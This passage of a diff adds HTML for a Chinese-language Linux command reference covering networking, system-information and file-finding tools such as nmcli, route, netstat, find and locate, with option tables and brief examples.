+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有接口信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动或关闭指定网卡</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>-promisc 设置是否支持网卡的 promiscuous 模式，选择此选项，网卡将接收网络中发给它所有的数据包</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>-allmulti 设置是否支持多播模式，选择此选项，网卡将接受网络中所有的多播数据包</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>配置 IP 地址</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>单网卡添加多个 IP 地址</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>删除 IP 地址</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动或关闭 ARP 协议</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> nslookup</h3>
+<p>nslookup 用于域名与 IP 地址的解析记录，语法格式：<code>nslookup [域名 | IP]</code></p>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> nmcli</h3>
+<p>nmcli 网络管理，查看设备信息，并进行配置，语法格式：<code>nmcli [选项] 对象 { COMMAND | help }</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">询问缺少的选项</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">是否在输出中使用颜色</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">值中的转义列分隔符</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">指定要输出的字段</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">打印此帮助</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">输出模式</td>
+</tr>
+<tr>
+<td style="text-align:center">-o</td>
+<td style="text-align:left">概览模式</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">漂亮输出</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">允许显示密码</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">简洁输出</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示程序版本</td>
+</tr>
+<tr>
+<td style="text-align:center">-w</td>
+<td style="text-align:left">设置等待完成操作的超时</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>对象，可以只写对象的前几个字母，或只写对象的第一个字母</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">对象</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">general</td>
+<td style="text-align:left">NetworkManager 的常规状态和操作</td>
+</tr>
+<tr>
+<td style="text-align:center">networking</td>
+<td style="text-align:left">整体联网控制</td>
+</tr>
+<tr>
+<td style="text-align:center">radio</td>
+<td style="text-align:left">NetworkManager radio 开关</td>
+</tr>
+<tr>
+<td style="text-align:center">connection</td>
+<td style="text-align:left">NetworkManager 的连接</td>
+</tr>
+<tr>
+<td style="text-align:center">device</td>
+<td style="text-align:left">由 NetworkManager 管理的设备</td>
+</tr>
+<tr>
+<td style="text-align:center">agent</td>
+<td style="text-align:left">NetworkManager secret agent or polkit agent</td>
+</tr>
+<tr>
+<td style="text-align:center">monitor</td>
+<td style="text-align:left">监视 NetworkManager 更改</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> route</h3>
+<p>route 用于查看网络信息，操作和显示 IP 路由表，语法格式：<code>route [选项] [-A family |-4|-6]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">不解析名字</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示详细的处理信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-F</td>
+<td style="text-align:left">显示转发信息库（默认）</td>
+</tr>
+<tr>
+<td style="text-align:center">-C</td>
+<td style="text-align:left">显示路由缓存</td>
+</tr>
+<tr>
+<td style="text-align:center">del</td>
+<td style="text-align:left">删除路由</td>
+</tr>
+<tr>
+<td style="text-align:center">add</td>
+<td style="text-align:left">添加新的路由</td>
+</tr>
+<tr>
+<td style="text-align:center">-net</td>
+<td style="text-align:left">目标地址是一个网络</td>
+</tr>
+<tr>
+<td style="text-align:center">-host</td>
+<td style="text-align:left">目标地址是一个主机</td>
+</tr>
+<tr>
+<td style="text-align:center">netmask</td>
+<td style="text-align:left">添加网络路由时，要使用的网络掩码</td>
+</tr>
+<tr>
+<td style="text-align:center">gw</td>
+<td style="text-align:left">通过网关路由数据包</td>
+</tr>
+<tr>
+<td style="text-align:center">metric</td>
+<td style="text-align:left">设置路由跳数</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> uname</h3>
+<p>uname 用于查看系统内核版本与系统架构等信息，语法格式：<code>uname [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示全部的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">显示电脑类型</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">显示在网络上的主机名称</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">显示操作系统的发行编号</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">显示操作系统名称</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> uptime</h3>
+<p>uptime 用于查看系统的负载信息，语法格式：<code>uptime [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">采用可读友好的格式输出系统已运行时长</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">以格式 2022-09-23 17:13:50 输出系统</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">显示帮助信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示版本信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
+<li>13:31:26：显示当前系统时间</li>
+<li>up 2 days, 20:17：系统已运行时间</li>
+<li>1 user：启用终端数量</li>
+<li>load average: 0.00, 0.00, 0.00：平均负载值（三个值分别为 1 分钟、5 分钟、15 分钟内的平均值，数值越小负载越低）</li>
+</ul>
+<h3> free</h3>
+<p>free 用于显示当前系统中内存的使用量，语法格式：<code>free [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">以 bytes 为单位来显示内存的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:left">以 kb 为单位来显示内存的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">以 m 为单位来显示内存的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">以 G 为单位来显示内存的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-h</td>
+<td style="text-align:left">以适于人类可读方式显示内存信息。-h 与其他命令最大不同是 -h 选项会在数字后面加上适于人类可读的单位</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">显示高低内存的利用率</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">显示 linux 的全部内存</td>
+</tr>
+<tr>
+<td style="text-align:center">-s N</td>
+<td style="text-align:left">表示每隔 N 秒打印一次内存信息，直到用 ctrl + c 结束</td>
+</tr>
+<tr>
+<td style="text-align:center">-c N</td>
+<td style="text-align:left">表示重复打印内存信息 N 次</td>
+</tr>
+<tr>
+<td style="text-align:center">-w</td>
+<td style="text-align:left">输出样式为：宽输出</td>
+</tr>
+<tr>
+<td style="text-align:center">-V</td>
+<td style="text-align:left">显示版本信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
+<li>total：总计内存的大小</li>
+<li>used：已使用内存的大小</li>
+<li>free：空闲内存的大小</li>
+<li>shared：多个进程共享的内存总额</li>
+<li>buff/cache：磁盘的缓存大小</li>
+<li>available：可以被新应用程序使用的内存大小</li>
+</ul>
+<h3> who</h3>
+<p>who 用于查看当前登入主机的用户终端信息，语法格式：<code>who [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有用户的所有信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">显示运行该程序的用户名，和 “who am I” 的作用一样</td>
+</tr>
+<tr>
+<td style="text-align:center">-q</td>
+<td style="text-align:left">只显示用户的登陆帐号和登陆用户的数量，该选项优先级高于其他任何选项</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">在登陆用户后面显示该用户最后一次对系统进行操作距今的时间</td>
+</tr>
+<tr>
+<td style="text-align:center">-H</td>
+<td style="text-align:left">显示列标题</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> last</h3>
+<p>last 用于调取主机的被访记录，语法格式：<code>who [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">把从何处登入系统的主机名称或 IP 地址，显示在最后一行</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">将 IP 地址转换成主机名称</td>
+</tr>
+<tr>
+<td style="text-align:center">-f &lt;记录文件&gt;</td>
+<td style="text-align:left">指定记录文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-n &lt;显示列数&gt;或-&lt;显示列数&gt;</td>
+<td style="text-align:left">设置列出名单的显示列数</td>
+</tr>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">不显示登入系统的主机名称或 IP 地址</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">显示系统关机，重新开机，以及执行等级的改变等信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> ping</h3>
+<p>ping 用于测试主机之间的网络连通性，语法格式：<code>ping [选项] 主机地址</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">总共发送次数</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">极限检测，快速连续 ping 一台主机，ping 的速度达到 100 次每秒</td>
+</tr>
+<tr>
+<td style="text-align:center">-I</td>
+<td style="text-align:left">指定网卡名称</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">每次间隔时间（秒）</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">不要将 IP 地址转换成主机名</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">指定每次 ping 发送的数据字节数，默认为 “56 字节” + “28 字节” 的 ICMP 头，一共是 84 字节；包头 + 内容不能大于 65535，所以最大值为 65507（linux:65507, windows:65500）</td>
+</tr>
+<tr>
+<td style="text-align:center">-W</td>
+<td style="text-align:left">最长等待时间（秒）</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>ping www.baidu.com</code></p>
+<h3> tracepath</h3>
+<p>tracepath 用于显示数据包达到主机途中所经过的路由信息，语法格式：<code>tracepath [选项] 域名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">主要以数字形式打印 IP 地址</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">打印主机名和 IP 地址</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">将 tracepath 的初始数据包长度设置为 pktlen，而不是 65535 或 tracepath6 的 128000</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">将最大跃点（或最大 TTL）设置为 max_hops，而不是 30</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">设置要使用的初始目标端口</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> netstat</h3>
+<p>netstat 用于显示网络连接、路由表、接口状态等网络相关信息，语法格式：<code>netstat [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">显示所有连接中的 Socket</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">显示正在使用的 Socket 信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">显示 TCP 协议的连接信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">显示 UDP 协议的连接信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">使用 IP 地址，不使用域名</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">仅列出正在监听的服务状态</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">现在网卡列表信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">显示路由表信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>State 链接状态：</p>
+<ul>
+<li>ESTABLISHED：指 TCP 连接已建立，双方可以进行方向数据传递</li>
+<li>CLOSE_WAIT：表示在等待关闭</li>
+<li>LISTENING：指 TCP 正在监听端口，可以接受链接</li>
+<li>TIME_WAIT：指连接已准备关闭</li>
+<li>FIN_WAIT_1：表示等待对方的 FIN 报文。SOCKET 在 ESTABLISHED 状态时，它想主动关闭连接，向对方发送了FIN 报文</li>
+<li>FIN_WAIT_2：表示等待对方的 FIN 报文。SOCKET 在 ESTABLISHED 状态时，它想主动关闭连接，向对方发送了FIN 报文，并对方回应 ACK 报文后</li>
+<li>LAST_ACK：是被动关闭一方在发送 FIN 报文后，最后等待对方的 ACK 报文</li>
+<li>SYNC_RECEIVED：收到对方的连接建立请求</li>
+<li>SYNC_SEND：已经主动发出连接建立请求</li>
+</ul>
+<h3> history</h3>
+<p>history 用于显示执行过的命令历史，语法格式：<code>history [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">清空当前用户在本机上执行的 Linux 命令历史记录信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">显示历史记录中最近的 N 个记录，例如 history 5</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>history</code></p>
+<h3> sosreport</h3>
+<p>sosreport 用于收集系统配置及架构信息并输出诊断文档，收集好的资料压缩文件以及校验码，在输出内容的最下面显示，语法格式：<code>sosreport [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">列出所有可用的插件及其选项</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">禁用指定的插件</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">启用指定的插件</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">对于所有的插件启用，将所有布尔选项设置为 True</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">增加日志记录的详细程度</td>
+</tr>
+<tr>
+<td style="text-align:center">--no-report</td>
+<td style="text-align:left">禁用 HTML 报告写入</td>
+</tr>
+<tr>
+<td style="text-align:center">--config-file</td>
+<td style="text-align:left">CONFIG：指定备用配置文件</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> watch</h3>
+<p>watch 命令会按照指定的间隔时间来执行命令并显示其输出，命令默认每 2 秒更新一次输出</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">指定更新输出的时间间隔</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">重标记出连续的命令输出之间的差异</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2> Linux 查找定位文件命令</h2>
+<h3> pwd</h3>
+<p>pwd 用于显示用户当前所处的工作目录</p>
+<p>example：</p>
+<p><code>pwd</code></p>
+<h3> cd</h3>
+<p>cd 用于切换当前的工作路径，语法格式：<code>cd [选项] [目录]</code></p>
+<p><code>cd -</code>：返回到上一次所处的目录
+<code>cd ../</code>：进入当前目录的上一级目录
+<code>cd ./</code>：进入当前目录
+<code>cd ~</code>：返回到当前用户的家目录</p>
+<p>example：</p>
+<p><code>cd /opt</code></p>
+<h3> ls</h3>
+<p>ls 用于显示目录中文件信息，语法格式：<code>ls [选项] [文件名称]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">查看目录下的所有文件，包括隐藏文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">查看文件属性、大小等详细信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">对文件反向排序</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">对文件以时间排序</td>
+</tr>
+<tr>
+<td style="text-align:center">-Z</td>
+<td style="text-align:left">查看文件的安全上下文值</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> tree</h3>
+<p>tree 用于以树状图的形式列出目录内容及结构，语法格式：<code>tree [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">打印所有文件,包括隐藏文件、目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-C</td>
+<td style="text-align:left">在文件和目录清单上加上色彩，便于区分文件类型</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">仅列出目录名称，而非内容</td>
+</tr>
+<tr>
+<td style="text-align:center">-D</td>
+<td style="text-align:left">列出文件或目录更改时间</td>
+</tr>
+<tr>
+<td style="text-align:center">-L</td>
+<td style="text-align:left">目录树的最大显示深度</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">打印结构同时打印文件权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">跟随目录的符号链接，就像它们是目录一样。 避免了导致递归循环的链接</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">打印每个文件的完整路径前缀</td>
+</tr>
+<tr>
+<td style="text-align:center">-F</td>
+<td style="text-align:left">在每个条目后加上文件类型的指示符（如目录是/）</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> find</h3>
+<p>find 用于按照指定条件来查找文件所对应的位置，语法格式：<code>find [查找范围] [选项]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-name</td>
+<td style="text-align:left">匹配名称</td>
+</tr>
+<tr>
+<td style="text-align:center">-perm</td>
+<td style="text-align:left">匹配权限（mode 为完全匹配，-mode 为包含即可）</td>
+</tr>
+<tr>
+<td style="text-align:center">-user</td>
+<td style="text-align:left">匹配所有者</td>
+</tr>
+<tr>
+<td style="text-align:center">-group</td>
+<td style="text-align:left">匹配所有组</td>
+</tr>
+<tr>
+<td style="text-align:center">-mtime -n +n</td>
+<td style="text-align:left">匹配修改内容的时间（-n 指 n 天以内，+n 指 n 天以前）</td>
+</tr>
+<tr>
+<td style="text-align:center">-atime -n +n</td>
+<td style="text-align:left">匹配访问文件的时间（-n 指 n 天以内，+n 指 n 天以前）</td>
+</tr>
+<tr>
+<td style="text-align:center">-ctime -n +n</td>
+<td style="text-align:left">匹配修改文件权限的时间（-n 指 n 天以内，+n 指 n 天以前）</td>
+</tr>
+<tr>
+<td style="text-align:center">-nouser</td>
+<td style="text-align:left">匹配无所有者的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-nogroup</td>
+<td style="text-align:left">匹配无所有组的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-newer f1 !f2</td>
+<td style="text-align:left">匹配比文件 f1 新但比 f2 旧的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">--type b/d/c/p/l/f</td>
+<td style="text-align:left">匹配文件类型（后面的字幕字母依次表示块设备、目录、字符设备、管道、链接文件、文本文件）</td>
+</tr>
+<tr>
+<td style="text-align:center">-size</td>
+<td style="text-align:left">匹配文件的大小（+50KB 为查找超过 50KB 的文件，而 -50KB 为查找小于 50KB 的文件）</td>
+</tr>
+<tr>
+<td style="text-align:center">-prune</td>
+<td style="text-align:left">忽略某个目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-exec .....{};</td>
+<td style="text-align:left">后面可跟用于进一步处理搜索结构的命令</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>find / -name anaconda-ks.cfg</code></p>
+<h3> locate</h3>
+<p>locate 用于按照名称快速搜索文件所对应的位置，语法格式：<code>locate 文件名称</code></p>
+<blockquote>
+<p>find 命令进行全盘搜索虽然更准确，但是效率有点低，如果仅仅是想找一些常见的、又知道大概名称的文件，不如试试 locate 命令。<br>
+locate 命令是将一些常用的目录作成一个索引库文件，一般叫做 <code>/var/lib/mlocate/mlocate.db</code>，后续再搜索文件的时候就是根据这个数据库中所包含的路径查找，速度会快很多</p>
+</blockquote>
+<blockquote>
+<p>第一次使用 locate 命令前，先执行 updatedb 命令来生成索引数据库，然后再进行查找</p>
+</blockquote>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> whereis</h3>
+<p>whereis 用于按照名称快速搜索二进制程序（命令）、源代码以及帮助手册文件所对应的位置，语法格式：<code>whereis 命令名称</code></p>
+<p>example：</p>
+<p><code>whereis cd</code></p>
+<h3> which</h3>
+<p>which 用于按照名称快速搜索二进制程序（命令）所对应的位置，语法格式：<code>which 命令名称</code></p>
+<p>example：</p>
+<p><code>which cd</code></p>
+<h3> cat</h3>
+<p>cat 用于查看纯文本文件（内容较少的），语法格式：<code>cat [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">显示行号</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">显示行号，空白行不显示行号</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">当遇到有连续两行或两行以上的空白行，就代换为一行的空白行</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">在输出内容的每一行后面加一个 $ 符号。（包括空白行）</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>cat anaconda-ks.cfg</code></p>
+<h3> more</h3>
+<p>more 用于查看纯文本文件（内容较多的），语法格式：<code>more [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>+&lt;number&gt;</code></td>
+<td style="text-align:left">从第 n 行开始显示</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-&lt;number&gt;</code></td>
+<td style="text-align:left">定义屏幕大小为 n 行</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>+/pattern</code></td>
+<td style="text-align:left">在每个档案显示前搜寻该字串（pattern），然后从该字串前两行之后开始显示</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-c</code></td>
